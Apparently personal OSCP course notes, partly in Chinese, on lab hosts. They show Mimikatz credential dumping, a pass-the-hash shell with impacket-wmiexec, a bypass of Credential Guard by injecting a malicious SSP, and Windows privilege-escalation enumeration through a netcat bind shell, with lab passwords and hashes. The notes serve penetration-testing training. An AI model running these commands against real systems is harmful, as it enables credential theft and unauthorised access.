---
title: '[OSCP, PEN-200] Instructional notes - Part 3'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 3
===

# [Link back to: "OSCP: Self Note - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "OSCP: Self Note - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 2](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md) 內容


# Password Attacks
## Working with Password Hashes
### ... [(Instructional notes - Part 2)](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#working-with-password-hashes)
### Windows Credential Guard
以上皆處理了屬於本機帳戶的雜湊值，若遇到其他類型的帳號 (ex. [Windows domain](https://en.wikipedia.org/wiki/Windows_domain) accounts)，取得 hash 便能進行爆破或是 pass-the-hash attack

>[!Important]
>domain hashes 相較於 local account hashes 不同:
>- local account hashes 儲存在 SAM 中
>- domain hashes 儲存在 memory 的 lsass.exe process

Mimikatz 可以識別這些儲存的憑證
前提： 以 Administrator 身份（or higher）運行並 啟用SeDebugPrivilege 存取權限

#### 1. 登入 RDP 留下 domain user's information
- SERVERWK248: 192.168.145.248
    > Administrator / QWERTY123!@#
- CLIENTWK246: 192.168.145.246
    > offsec / lab
- CLIENTWK245: 192.168.145.245
    > offsec / lab

以下範例以 CORP\Administrator 使用者身分 (pwd: QWERTY!@#2/）) 登入 RDP 進入 CLIENTWK246:
```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.246 /dynamic-resolution
[00:19:01:640] [769709:769710] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
```
> 當成功連線時， LSASS 已在 memory 中快取了網域用戶的資訊
>> 接著「登出」
>> 使用 本機管理員 offsec 的身分重新登入

```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"offsec" /p:"lab" /v:192.168.145.246 /dynamic-resolution
```
![image](https://hackmd.io/_uploads/SkGXbLe91g.png)

#### 2. 登入 local administrator 執行 Mimikatz
```
PS C:\> cd .\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2452263 (00000000:00256b27)
Session           : RemoteInteractive from 3
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
Logon Time        : 2/16/2025 10:42:00 PM
SID               : S-1-5-21-180219712-1214652076-1814130762-1002
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : CLIENTWK246
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : a188967ac5edb88eca3301f93f756ca8
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : offsec
         * Domain   : CLIENTWK246
         * Password : (null)
        ssp :
        credman :
        cloudap :

...

Authentication Id : 0 ; 1173179 (00000000:0011e6bb)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 2/16/2025 10:40:09 PM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
         * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : Administrator
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

...
mimikatz #
```
> `sekurlsa::logonpasswords`: dump all available credentials\
> domain user 不會存在 SAM, 因此不會使用 `lsadump::sam`\
> (可參見: [#Cracking NTLM 2.3](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#23-%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A2%BC%E5%92%8C%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A))


以上透過 Mimikatz 取得本機 offsec 使用者的憑證資訊，也從 CORP.COM domain 中獲得管理員使用者的資訊：
```
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
...
* NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e

User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
...
* NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
```

#### 3. 將取得的 credentials 利用 pass-the-hash attack
可以利用以上 Administrator 資訊， 透過 pass-the-hash attack 存取 SERVERWK248 (192.168.145.248) 
```
┌──(chw㉿CHW)-[~]
└─$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.145.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.145.248 and isFQDN is False
[+] StringBinding: SERVERWK248[57267]
[+] StringBinding: 192.168.145.248[57267]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.145.248[57267]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
corp\administrator
```

>[!Warning]
>微軟為了強化安全性，引入 
>1. [VBS](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)（Virtualization-Based Security):\
>VBS 是微軟利用 CPU virtualization, 建立和隔離記憶體的安全區域: [Virtual Secure Mode](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM)
>VBS runs a [hypervisor](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system.
> 2. VSM 透過 [Virtual Trust Levels](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf)(VTLs) 來維持這種隔離，目前 Microsoft 支援最多 16 個級別
> 
> 3. VBS 內部的 Virtual Trust Levels（VTL，虛擬信任層）
>- **VTL0 (VSM Normal Mode)**: 執行普通的 Windows 環境（一般應用程式、使用者模式與核心模式）。
>- **VTL1 (VSM Secure Mode)**: Windows 安全機制，存放 LSASS（本機安全驗證系統） 的關鍵資料，例如密碼雜湊與憑證。
>
>user-mode in VTL1: [Isolated User-Mode (IUM)](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes)處理 Trusted Processes, Secure Processes 或 Trustlets

以上 features 皆是在 Windows 10 和 Windows Server 2016 首次推出，預設皆為 Disable。所以在大多企業都沒有啟用。

>[!Important]
>Credential Guard 的影響:\
>一般情況下，Mimikatz 可以從 `lsass.exe` 記憶體中截取明文密碼或 NTLM 雜湊。\
>Credential Guard 啟用時，敏感資料都存放在 VTL1 的 LSAISO.exe，即使拿到 SYSTEM 權限，也無法存取這些資訊。(Mimikatz 只能讀取 LSASS process)

#### 確認是否運行 Credential Guard
```
PS C:\Users\offsec> Get-ComputerInfo

WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
...
HyperVisorPresent                                       : True
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
```
> DeviceGuardSecurityServicesRunning下啟用的措施之一是`CredentialGuard`。

#### Credential Guard 啟用下使用 Mimikatz
```
PS C:\Users\offsec> cd C:\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
```

> 在同樣成功登入 domain CORP.COM 的情況下，無法取得 cached hashes

#### 如何繞過 Credential Guard
Windows 提供了多種身份[驗證機制](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))，例如：\
- LSA（Local Security Authority，當地安全機構）
- Winlogon（Windows 登入程序）
- SSPI（Security Support Provider Interface，安全支援提供者介面）

其中 SSPI 是 Windows 認證的基礎機制，所有需要身份驗證的應用程式和服務都會透過 SSPI 進行身份驗證。Windows 預設提供多種 Security Support Providers（SSP，安全支援提供者），如：
- Kerberos SSP（負責 Kerberos 驗證）
- NTLM SSP（負責 NTLM 驗證）
這些 SSP 都是以 DLL 檔案存在，每當進行身份驗證時，SSPI 會決定要使用哪一個 SSP 來處理請求。

#### 攻擊手法
Windows 允許透過 AddSecurityPackage API 或 修改登錄檔 來新增自訂的 SSP：

登錄路徑：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages`\
每次系統開機時，LSASS 皆會讀取這個登錄鍵中的所有 SSP，並將對應的 DLL 載入到記憶體中。\
**這代表如果我們開發一個惡意 SSP 並將其註冊到 LSASS，就可以讓 Windows 透過我們的 SSP 來處理身份驗證，從而攔截並取得使用者的明文密碼。**

>[!Important]
>Mimikatz 已經內建這種攻擊方式，透過 `memssp` 來實作。
memssp 的特點：\
- 不會在磁碟上留下 DLL 檔案，直接注入記憶體（避免被防毒軟體偵測）。
- 攔截所有經過 SSPI 的身份驗證請求，並記錄明文密碼到 `C:\Windows\System32\mimilsa.log`。

Mimikatz 注入惡意 SSP
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```
在惡意 SSP 注入後，
1. 等待另一個使用者遠端連接到機器
2. 社交工程

(透過手動登入)
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.245 /dynamic-resolution
```
透過 RDP 成功驗證機器身分後，登出。\
再以本機管理員(offsec) 登入 CLIENTWK245 ，調查惡意 SSP 的結果。
驗證 Mimikatz 注入 SSP 到 LSASS時，憑證將會保存在日誌檔案    `C:\Windows\System32\mimilsa.log`。
```
PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?
```
> CORP\Administrator  QWERTY123!@#

# Windows Privilege Escalation

## Enumerating Windows
First need to get familiar with the Windows privilege structure and access control mechanisms.
### Understanding Windows Privileges and Access Control Mechanisms
#### 1. [Security Identifier](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) (SID) 
Windows uses a SID to identify entities. SID 是獨立的 value，會分配給每個 entity 或 principa，讓 Windows 識別 users 和 groups。
-  [Local Security Authority](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)(LSA): 產生 local accounts and groups
- Domain Controller (DC): 產生 domain users and domain groups
>[!Tip]
> Windows uses only the SID, not usernames, to identify principals for access control management.

SID 格式：`S`、`R`、`X` 和 `Y` 表示
```
S-R-X-Y
```
> `S`：固定，表示是一個 SID。\
`R`（Revision）：SID 版本，目前固定為 1。\
`X`（Identifier Authority）：表示識別碼的發行機構，5（NT Authority）：最常見，表示本機或網域中的使用者和群組。\
`Y`（Sub Authorities）：細分權限的識別碼，包含：
>- 網域識別碼（Domain Identifier）：對於本機使用者，這是該機器的識別碼；對於網域使用者，則是網域的識別碼。
>- 相對識別碼（RID, Relative Identifier）：用來區分個別使用者或群組。

```
PS C:\> whoami /user

USER INFORMATION
----------------

User Name        SID
================ ==============================================
chw-macbook\cwei S-1-5-21-1336799502-1441772794-948155058-1001
```
> `S-1-5`：表示 NT Authority。\
`21-1336799502-1441772794-948155058`：這部分是網域或本機識別碼。\
`1001`（RID）：表示這是該系統上的第二個本機使用者（第一個通常是 1000）。


[well-known SIDs](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) ( RID under 1000 ):
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

#### 2. [access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
>[!Tip]
>The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token.

- Primary Token：
由 登入的使用者 擁有，會附加到該使用者啟動的任何 Process 或 Thread，目的是為了定義每個 object 之間的 permissions。
例如: 當使用者開啟 cmd.exe，該命令提示字元的 process 會擁有該使用者的 Primary Token。
- Impersonation Token：
允許 Thread 使用不同於其 process 的權限來存取物件。
例如: 當某個程式需要以 不同使用者的身分 執行時，可能會使用 Impersonation Token。

#### 3. [Mandatory Integrity Control](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)

除了 SID 和 Token 之外，Windows 透過 [Integrity Level](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) 來進一步限制存取權限，這個機制可以防止 **低權限的應用程式影響高權限的應用程式**。

From Windows Vista onward, processes run on five integrity levels:
```
- System integrity – Kernel-mode processes with SYSTEM privileges
- High integrity – Processes with administrative privileges
- Medium integrity – Processes running with standard user privileges
- Low integrity level – Restricted processes, often used for security   [sandboxing](https://en.wikipedia.org/wiki/Sandbox_(software_development)), such as web browsers.
- Untrusted – The lowest integrity level, assigned to highly restricted processes that pose potential security risks
```
[Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) 可以檢查 process integrity levels

![image](https://hackmd.io/_uploads/SJwrBog9kx.png)
> 圖中皆執行 Powershell，可以推斷出 High integrity level process 是由 administrative user 啟動的，而 Medium integrity level process  是由 regular user 啟動的

#### 4. [User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
為了保護 operating system，即使使用者是 Administrator，執行時仍會預設以標準使用者權限運行，降低系統被攻擊的風險。 

當管理員帳戶登入 Windows 時，系統會分配 兩個 Access Tokens：
- Filtered Admin Token (standard user token)：
預設使用的 Token ，所有應用程式和操作都以標準使用者權限運行，不能直接修改系統關鍵檔案或 Registry。
- Administrator Token：
只有在需要提升權限時才會使用，例如修改系統設定或安裝軟體。
(會跳出 [UAC consent prompt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 視窗，需手動確認)

From Windows Vista onward, processes run on four integrity levels:
```
System integrity – Kernel-mode processes with SYSTEM privileges
High integrity – Administrative processes
Medium integrity – Standard user processes
Low integrity – Restricted processes, commonly used for sandboxing (e.g., web browsers)
```

### Situational Awareness
key pieces of information:
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

以下 nc CLIENTWK220 system bind shell 為例：
#### - whoami
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.187.220 4444
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>whoami
whoami
clientwk220\dave
```
> 顯示的 hostname `clientwk220`，可以知道機器是 client system 不是 Server
> > 若是 Server 或 AD: `server01\administrator`, `dc01\administrator`

#### - whoami /groups
```
C:\Users\dave>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID                                            Attributes                                        
==================================== ================ ============================================== ==================================================
Everyone                             Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
CLIENTWK220\helpdesk                 Alias            S-1-5-21-2309961351-4093026482-2223492918-1008 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
> 1. dave 是 `helpdesk group` 的成員，Helpdesk staff 通常會有其他存取權限
> 2. `BUILTIN\Remote Desktop` Users，可能會有權限連接 RDP 到系統
> 3. 其他皆是 non-privileged users 的 standard (ex. `Everyone`, `BUILTIN\Users`)

#### - net user / Get-LocalUser
>[!Note]
> - `net user`: 列出 Local user，若在網域環境中執行，會顯示 domain user，只會列出 account name ，不包含其他詳細資訊，如帳號啟用狀態或描述
> - `Get-LocalUser`: 列出本機帳號，並顯示帳號啟用狀態、描述等詳細資訊

```
C:\Users\dave>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> net user
net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave                     
daveadmin                DefaultAccount           Guest                    
offsec                   steve                    WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\dave> Get-LocalUser
Get-LocalUser

Name               Enabled Description                                                                                 
----               ------- -----------                                                                                 
Administrator      False   Built-in account for administering the computer/domain                                      
BackupAdmin        True                                                                                                
dave               True    dave                                                                                        
daveadmin          True                                                                                                
DefaultAccount     False   A user account managed by the system.                                                       
Guest              False   Built-in account for guest access to the computer/domain                                    
offsec             True                                                                                                
steve              True                                                                                                
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```
> 1. Administrator 帳號被停用
> 2. steve 與 dave 是一般用戶
> 3. (名稱猜測) daveadmin 與 BackupAdmin，可能有 amdin 的價值
> 4. Administrators 通常會有 non-privileged 和 privileged 的帳號權限 
> 
> `net user` 與 `Get-LocalUser` 顯示結果數量相同，也能猜測這台機器沒有 AD

#### - net localgroup / Get-LocalGroup
>[!Note]
> `Get-LocalGroup`: 多顯示每個 Group 的用途
```
PS C:\Users\dave> net localgroup
net localgroup

Aliases for \\CLIENTWK220

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*adminteam
*Backup Operators
*BackupUsers
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*helpdesk
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

PS C:\Users\dave> Get-LocalGroup
Get-LocalGroup

Name                                Description                                                                        
----                                -----------                                                                        
adminteam                           Members of this group are admins to all workstations on the second floor           
BackupUsers                                                                                                            
helpdesk                                                   
...
Administrators                      Administrators have complete and unrestricted access to the computer/domain     
...
Remote Desktop Users                Members in this group are granted the right to logon remotely                      
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
...
Users                               Users are prevented from making accidental or intentional system-wide changes an...

PS C:\Users\dave> 
```
> 1. group name BackupUsers 可能跟 user BackupAdmin 有關，另外 Backup 可能會有 file system 權限
> 2. `Administrators`, `adminteam`, `Backup Operators`, `Remote Desktop Users`, and `Remote Management Users` 可以繼續分析的 Group

```
PS C:\Users\dave> Get-LocalGroupMember adminteam
Get-LocalGroupMember adminteam

ObjectClass Name                PrincipalSource
----------- ----                ---------------
User        CLIENTWK220\daveadmin Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin     Local  
User        CLIENTWK220\offsec        Local
```
> 只有 daveadmin 在 adminteam group
> > daveadmin 既是 adminteam 成員，又是 Administrators
> > 另外，adminteam 不在 Administrators Group，所以不是管理者權限。
>
> 除了 local Administrator account 被停用，daveadmin, BackupAdmin 和 offsec 也是 Administrator group。

查看 RDP 與 Remote Management
```
PS C:\Users\dave> Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Desktop Users"

ObjectClass Name              PrincipalSource
----------- ----              ---------------
User        CLIENTWK220\dave  Local          
User        CLIENTWK220\steve Local          


PS C:\Users\dave> Get-LocalGroupMember "Remote Management Users" 
Get-LocalGroupMember "Remote Management Users"

ObjectClass Name                  PrincipalSource
----------- ----                  ---------------
User        CLIENTWK220\daveadmin Local          
User        CLIENTWK220\steve     Local
```

#### - systeminfo
收集系統資料
```
PS C:\Users\dave> systeminfo
systeminfo

Host Name:                 CLIENTWK220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22621 N/A Build 22621
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
...
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
...

```
> Windows 11 Pro system ([現有版本](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)識別): `build 22621 is the version 22H2 of Windows 11`\
> x64-based PC: 64-bit system


#### - ipconfig
```
PS C:\Users\dave> ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-C8-13
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::7e7:95d:5d0:aa99%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.187.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.187.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2E-83-35-C9-00-50-56-AB-9D-6F
   DNS Servers . . . . . . . . . . . : 192.168.187.254
   NetBIOS over Tcpip. . . . . . . . : Enabled
```
> 沒有設定 [Dynamic_Host_Configuration_Protocol](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol) (DHCP)，手動設定 IP
> DNS server, gateway, subnet mask, and MAC address.

#### - route print
顯示 routing table，可以增加我們的攻擊面
```
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  4...00 50 56 ab c8 13 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.187.254  192.168.187.220     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.187.0    255.255.255.0         On-link   192.168.187.220    271
  192.168.187.220  255.255.255.255         On-link   192.168.187.220    271
  192.168.187.255  255.255.255.255         On-link   192.168.187.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.187.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.187.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.187.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    271 fe80::/64                On-link
  4    271 fe80::7e7:95d:5d0:aa99/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
> `vmxnet3 Ethernet Adapter`：代表是一台 VMware 虛擬機 (已知訊息)

#### - netstat
list all active network connections
```
PS C:\Users\dave> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1016
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3508
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1148
